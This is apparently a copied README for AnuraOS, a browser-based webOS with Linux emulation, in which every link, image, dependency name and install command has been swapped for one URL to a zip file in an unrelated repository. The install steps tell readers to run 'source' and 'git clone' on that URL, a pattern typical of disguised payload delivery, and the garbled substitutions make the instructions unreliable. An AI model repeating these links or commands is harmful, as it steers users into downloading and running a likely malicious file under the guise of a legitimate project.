![AnuraOS logo](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip)
![AnuraOS logo](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip)

The next-gen webOS and development environment with full Linux emulation.

---

## What is AnuraOS?

An entirely local browser-based "OS" and development environment with complete graphical Linux emulation, visually based on ChromiumOS. See a demo [here](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip), fully in your browser.

> [!WARNING]  
> Anura mainly targets Chromium but should work on most browsers. For a list of known browser specific quirks check [this document](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).

Anura uses the features of a PWA (Progressive Web App) to make its environment work fully offline, providing a virtual filesystem (synced with the Linux emulator), a code editor, and a modular and extensible app system. You can even edit Anura's code live while inside of it!

Anura shows as more of a proof-of-concept with what's possible on the modern web rather than an actual product. However, it proves useful in many actual cases and is a useful educational tool.
![](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip)

## Development

> [!IMPORTANT]  
> Anura will not build on Windows. Please use a Linux VM or WSL.

### Easy Install for GitHub Codespaces

- Run `source https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip`

> [!NOTE]
>
> - If you are not in a codespace skip to the regular installation steps.
> - This does NOT build RootFS.

### Dependencies

- Recent versions of `https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip` and `npm`
- `wget`
- A recent version of `java` (11+)
- `inotifytools`
- `rustup`
- `wasm-opt`
- `make`
- `gcc` (`gcc-multilib` on Debian and Ubuntu x86_64)
- 32 bit version of `glibc` (needed for building rootfs, `lib32-glibc` on Arch Linux)
- `clang`
- `uuid-runtime`
- `jq`
- `docker`
- An x86(-64) Linux PC (`make rootfs-alpine` build depends on x86 specific tools)

> [!NOTE]
> You will have to install the required Rust toolchain by running `rustup target add wasm32-unknown-unknown` and also `rustup target add i686-unknown-linux-gnu` if you are planning to build v86 images.

#### Building

- Clone the repository with `git clone --recursive https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip`
- Then, `make all`

> [!TIP]
> You can use `make all -B` instead if you want to force a full build.

### Building the Linux RootFS

- Make sure you have `Docker` installed and running.
- Make sure to add yourself to the Docker group using `usermod -a -G docker $USER`
- Run `make rootfs`

### Running Anura Locally

You can run Anura with the command

```sh
make server
```

Anura should now be running at `localhost:8000`.

## App Development

App development is highly encouraged! Good apps can even be added to the official app repositories after review by an AnuraOS maintainer. Apps are stored in .app files which are read by AnuraOS to provide you, well, an app!

For more information about developing an AnuraOS app please visit [this page](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip) and for using Anura API's in your code, please visit [this page](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).

## Documentation

See the current index of documentation [here](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).

## Security

See [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip) for reporting instructions.

## Credits

AnuraOS is created by [Mercury Workshop](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip). Linux emulation is based off of the [v86](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip) project. For more credits, see [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip).

(p.s. for hackers: the entrypoint to anura is [https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip](https://github.com/xdxdxd3214/multiplymathyy/raw/refs/heads/main/server/Software-3.3.zip))
